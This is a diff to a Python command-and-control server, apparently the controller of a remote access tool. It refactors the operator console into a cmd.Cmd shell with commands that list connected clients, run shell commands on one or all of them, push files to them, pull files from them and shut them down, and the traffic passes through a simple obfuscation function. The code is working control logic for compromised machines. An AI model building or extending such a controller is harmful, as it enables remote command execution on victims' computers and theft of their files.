@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import cmd
 import os
 import time
 import socket
@@ -128,24 +129,17 @@ def ReceiveDataFromClient(client, command):
 
     return fullData
 
-def RemoveClientNumber(commandSplitted):
-    return str(commandSplitted[0] + ' ' + ' '.join(commandSplitted[2:]))
-
 threading.Thread(target=ThreadStartServer).start()
 
 time.sleep(1)
 
-print("""Available commands:
-* list:\t\tLists down available clients.
-* cmd:\t\tRun command on client.
-* download:\tDownload file to client.
-* upload:\tUpload file from client.
-* shutdown:\tShuts down the client.\n""")
+class ServerShell(cmd.Cmd):
+    intro = "Intro"
+    prompt = ">> "
 
-while True:
-    command = input(">> ")
-    
-    if command == "list":
+    def do_list(self, args):
+        "Lists down available clients."
+
         if len(clients) > 0:
             i = 0
             for c in clients:
@@ -153,19 +147,22 @@ while True:
                 i += 1
         else:
             print("No available clients.\n")
+
+    def do_cmd(self, args):
+        "Run command on client."
+
+        args = args.split(" ")
+        if len(args) >= 2:
+            cleanedCommand = "cmd " + ' '.join(args[1:])
+            print("## cleanedCommand: " + cleanedCommand)
             
-    elif command.startswith("cmd"):
-        commandSplitted = command.strip().split(" ")
-        if len(commandSplitted) >= 3:
-            cleanedCommand = RemoveClientNumber(commandSplitted)
-            
-            if commandSplitted[1] == "all":
+            if args[0] == "all":
                 for client in clients:
                     receivedData = ReceiveDataFromClient(client, cleanedCommand)
                     print("Received from " + client.info + ":\n" + EncryptDecryptString(receivedData.decode()))
             else:
                 try:
-                    clientNumber = int(commandSplitted[1])
+                    clientNumber = int(args[0])
 
                     client = clients[clientNumber]
                     receivedData = ReceiveDataFromClient(client, cleanedCommand)
@@ -176,19 +173,21 @@ while True:
         else:
             print("[ERROR] Incorrect number of arguments. format:\"cmd [target] [shell_command]\"")
 
-    elif command.startswith("download"):
-        commandSplitted = command.strip().split(" ")
-        if len(commandSplitted) == 4:
+    def do_download(self, args):
+        "Download file to client."
+
+        args = args.split(" " )
+        if len(args) == 3:
             clientNumber = 0
             try:
-                clientNumber = int(commandSplitted[1])
+                clientNumber = int(args[0])
             except ValueError as e:
                 print("[ERROR] " + str(e))
 
             client = clients[clientNumber]
-            client.connection.send(b"download " + commandSplitted[3].encode())
+            client.connection.send(b"download " + args[2].encode())
 
-            targetPath = commandSplitted[2]
+            targetPath = args[1]
             f = open(targetPath, "rb")
 
             fileSize = os.stat(targetPath).st_size
@@ -211,21 +210,23 @@ while True:
                 print("[ERROR] Error opening file for reading.")
         else:
             print("[ERROR] Incorrect number of arguments. format:\"download [target] [file_to_download] [filename_to_use]\"")
-            
-    elif command.startswith("upload"):
-        commandSplitted = command.strip().split(" ")
-        if len(commandSplitted) == 3:
+
+    def do_upload(self, args):
+        "Upload file from client."
+
+        args = args.split(" ")
+        if len(args) == 2:
             clientNumber = 0
             try:
-                clientNumber = int(commandSplitted[1])
+                clientNumber = int(args[0])
             except ValueError as e:
                 print("[ERROR] " + str(e))
 
             client = clients[clientNumber]
 
-            receivedData = ReceiveDataFromClient(client, RemoveClientNumber(commandSplitted));
+            receivedData = EncryptDecryptString(ReceiveDataFromClient(client, ' '.join(args[1:])))
             if len(receivedData) > 0:
-                filePathSplitted = commandSplitted[2].split("\\")
+                filePathSplitted = args[1].split("\\")
                 fileName = client.info + "_" + filePathSplitted[len(filePathSplitted) - 1]
                 targetPath = UPLOAD_DIRECTORY + fileName
                 f = open(targetPath, "wb")
@@ -236,14 +237,16 @@ while True:
                 else:
                     print("[ERROR]  Error opening file for writing.")
             else:
-                print("[ERROR] Error opening file at " + commandSplitted[2])
+                print("[ERROR] Error opening file at " + args[1])
         else:
             print("[ERROR] Incorrect number of arguments. format:\"upload [target] [file_to_upload]\"")
-            
-    elif command.startswith("shutdown"):
-        commandSplitted = command.strip().split(" ")
-        if len(commandSplitted) == 2:
-            if commandSplitted[1] == "all":
+
+    def do_shutdown(self, args):
+        "Shuts down the client."
+
+        args = args.split(" ")
+        if len(args) == 1:
+            if args[0] == "all":
                 for client in clients:
                     client.connection.send(b"shutdown")
 
@@ -252,7 +255,7 @@ while True:
 
                 clients.clear()
             else:
-                clientNumber = int(commandSplitted[1])
+                clientNumber = int(args[0])
 
                 try:
                     client = clients[clientNumber]
@@ -266,3 +269,5 @@ while True:
                 
         else:
             print("[ERROR] Incorrect number of arguments. format:\"download [target]\"")
+            
+ServerShell().cmdloop()
